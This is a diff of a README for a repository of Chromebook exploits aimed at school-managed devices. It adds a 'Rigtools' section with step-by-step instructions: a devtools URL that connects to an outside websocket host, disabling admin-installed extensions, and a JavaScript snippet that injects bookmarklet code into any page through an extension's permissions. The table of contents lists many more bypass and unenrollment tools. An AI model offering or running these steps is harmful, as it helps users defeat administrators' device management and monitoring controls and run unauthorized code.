@@ -14,43 +14,87 @@ Thank you to all of the contributors! Ya'll are pretty epic :D
 <a href="https://github.com/3kh0/ext-remover/graphs/contributors"><img src="https://contrib.rocks/image?repo=3kh0/ext-remover" /></a>
 
 - [EXT-REMOVER](#ext-remover)
+  * [Rigtools](#rigtools)
   * [ExtHang3r](#exthang3r)
-  * [CryptoSmite *Unenrollment*](#cryptosmite-unenrollment)
-  * [SH1MMER *Unenrollment*](#sh1mmer-unenrollment)
+  * [CryptoSmite *Unenrollment*](#cryptosmite--unenrollment)
+  * [SH1MMER *Unenrollment*](#sh1mmer--unenrollment)
   * [Hapara Focus Session Bypass](#hapara-focus-session-bypass)
-  * [GuardianTabCrash *Unrestricted browsing*](#guardiantabcrash-unrestricted-browsing)
-  * [Skiovox *Unrestricted browsing*](#skiovox-unrestricted-browsing)
-  * [LTBEEF *Disable extensions*](#ltbeef-disable-extensions)
-  * [LoMoH *Disable extensions*](#lomoh-disable-extensions)
-  * [LTMEAT *Disable extensions*](#ltmeat-disable-extensions)
-  * [LTMEAT Flood *Freeze extensions*](#ltmeat-flood-freeze-extensions)
-  * [Temp TMEAT *Freeze extensions*](#temp-tmeat-freeze-extensions)
-  * [Baby LTMEAT *Freeze extensions*](#baby-ltmeat-freeze-extensions)
-  * [LTMEAT Print *Freeze extensions*](#ltmeat-print-freeze-extensions)
-  * [Dextensify *Disable extensions*](#dextensify-freeze-extensions)
-  * [JPCMG *LTBEEF w/ Service workers*](#jpcmg-ltbeef-w-service-workers)
-  * [Corkey *Corrupt extensions*](#corkey-corrupt-extensions)
-  * [Extension Launcher *Install extensions w/o allowlist*](#extension-launcher-install-extensions-wo-allowlist)
-  * [Point-Blank *Execute scripts on extension pages*](#point-blank-execute-scripts-on-extension-pages)
-  * [UBoss *Tamper with IBoss*](#uboss-tamper-with-iboss)
-  * [CAUB *Prevent Updates*](#caub-prevent-updates)
-  * [CAUB Flags *Prevent Updates*](#caub-flags-prevent-updates)
+  * [GuardianTabCrash *Unrestricted browsing*](#guardiantabcrash--unrestricted-browsing)
+  * [Skiovox *Unrestricted browsing*](#skiovox--unrestricted-browsing)
+  * [LTBEEF *Disable extensions*](#ltbeef--disable-extensions)
+  * [LoMoH *Disable extensions*](#lomoh--disable-extensions)
+  * [LTMEAT *Disable extensions*](#ltmeat--disable-extensions)
+  * [LTMEAT Flood *Freeze extensions*](#ltmeat-flood--freeze-extensions)
+  * [Temp TMEAT *Freeze extensions*](#temp-tmeat--freeze-extensions)
+  * [Baby LTMEAT *Freeze extensions*](#baby-ltmeat--freeze-extensions)
+  * [LTMEAT Print *Freeze extensions*](#ltmeat-print--freeze-extensions)
+  * [Dextensify *Freeze extensions*](#dextensify--freeze-extensions)
+  * [JPCMG *LTBEEF w/ Service workers*](#jpcmg--ltbeef-w--service-workers)
+  * [Corkey *Corrupt extensions*](#corkey--corrupt-extensions)
+  * [Extension Launcher *Install extensions w/o allowlist*](#extension-launcher--install-extensions-w-o-allowlist)
+  * [Point-Blank *Execute scripts on extension pages*](#point-blank--execute-scripts-on-extension-pages)
+  * [UBoss *Tamper with IBoss*](#uboss--tamper-with-iboss)
+  * [CAUB *Prevent Updates*](#caub--prevent-updates)
+  * [CAUB Flags *Prevent Updates*](#caub-flags--prevent-updates)
   * [Blank3r](#blank3r)
-  * [Downgrading *Change versions*](#downgrading-change-versions)
-  * [Pollen *Policy Editor*](#pollen-policy-editor)
-  * [Killcurly *Break extensions*](#killcurly-break-extensions)
-  * [Shimboot *Boot Linux*](#shimboot-boot-linux)
-  * [uBlock Run *Run Code On Pages*](#ublock-run-run-code-on-pages)
-  * [uRun - Bypass bookmarklet restrictions with ublock](#urun---bypass-bookmarklet-restrictions-with-ublock)
-  * [Quick View *Bypass extensions*](#quick-view-bypass-extensions)
-  * [Buypass *Bypass extensions*](#buypass-bypass-extensions)
-  * [Chaos *Hapara bypass*](#chaos-hapara-bypass)
-  * [SOT Exploit *Open URLs in OneTab*](#sot-exploit-open-urls-in-onetab)
-  * [GoGuardian GoAway *GoGuardian bypass*](#goguardian-goaway-goguardian-bypass)
-  * [Microsoft Labs](#microsoft-labs-virtualbox-but-it-got-20-doses-of-the-covid-vaccine)
+  * [Downgrading *Change versions*](#downgrading--change-versions)
+  * [Pollen *Policy Editor*](#pollen--policy-editor)
+  * [Killcurly *Break extensions*](#killcurly--break-extensions)
+  * [Shimboot *Boot Linux*](#shimboot--boot-linux)
+  * [uBlock Run *Run Code On Pages*](#ublock-run--run-code-on-pages)
+  * [uRun - Bypass bookmarklet restrictions with uBlock](#urun---bypass-bookmarklet-restrictions-with-ublock)
+  * [Quick View *Bypass extensions*](#quick-view--bypass-extensions)
+  * [Buypass *Bypass extensions*](#buypass--bypass-extensions)
+  * [Chaos *Hapara bypass*](#chaos--hapara-bypass)
+  * [SOT Exploit *Open URLs in OneTab*](#sot-exploit--open-urls-in-onetab)
+  * [GoGuardian GoAway *GoGuardian bypass*](#goguardian-goaway--goguardian-bypass)
+  * [Microsoft Labs](#microsoft-labs--virtualbox-but-it-got-20-doses-of-the-covid-vaccine)
 
 <small><i><a href='http://github.com/3kh0/readme-toc/'>Table of contents generated with readme-toc</a></i></small>
 
+## Rigtools
+
+**Rigtools** is an exploit that allows users to run code on extensions, disable extensions, and basically do whatever to and with the extension as long as the extension has the correct permissions. It is **patched** in Chrome OS 129 and above as of October 2024.
+
+### How do to use it?
+
+1. Open this link and just leave it alone. (Note: This will not run code it's just there to fix the second page.)
+```md
+devtools://devtools/bundled/devtools_app.html
+```
+2. Open this link and go to Network
+
+```md
+devtools://devtools/bundled/devtools_app.html?experiments=true&ws=rig.kxtz.dev/
+```
+3. Double-Click the black/grey box:
+![image](https://github.com/user-attachments/assets/08996bac-ebc1-4526-973d-ea766731cc9e)
+![image](https://github.com/user-attachments/assets/f9ae4b07-d3f3-4318-9d63-404b9142e4f0)
+
+4. Click extension-ID and find your extension-ID.
+5. Paste in the extension ID and it should load a filesystem: page. You may have other extensions under it, you can disable those too.
+
+
+Lastly, You can run code like
+```js
+alert("hi")
+```
+so if you have the correct permissions on your extensions manifest file you can run this code below to run a certain piece of code on any page:
+    - tabs
+    - activeTab
+    - browserAction
+    - 'unsafe-eval' set in the CSP (content-security-policy)
+If it does not have these permissions, this will not work. (These are in the manifest file.)
+```js
+chrome.browserAction.onClicked.addListener(() => {chrome.tabs.executeScript(null, {code: `location.href="javascript:replace this part with your own bookmarklet.";`});});
+```
+and if it works nice! If it doesn't then cry in a corner.
+
+
+Link to repo to self host for new/unofficial ui: https://github.com/Sincereham222/rigtools-newui
+Link to repo for official ui: https://github.com/FWSmasher/rigtools
+
+[**🔼 Back to top**](#ext-remover)
 ## ExtHang3r
 
 **ExtHang3r** is an exploit that allows users to toggle admin-installed extentions on and off. It remains **unpatched** in Chrome OS 127 as of October 2024.
